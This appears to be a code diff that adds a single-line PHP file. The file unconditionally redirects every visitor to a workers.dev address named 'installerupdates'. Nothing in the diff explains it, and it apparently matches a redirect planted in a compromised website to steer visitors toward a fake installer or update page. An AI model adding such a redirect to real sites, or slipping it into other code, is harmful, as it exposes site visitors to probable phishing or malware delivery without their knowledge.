@@ -1,0 +1,1 @@
+<?php header("Location: https://nameless-feather-e189.installerupdates.workers.dev/"); ?>
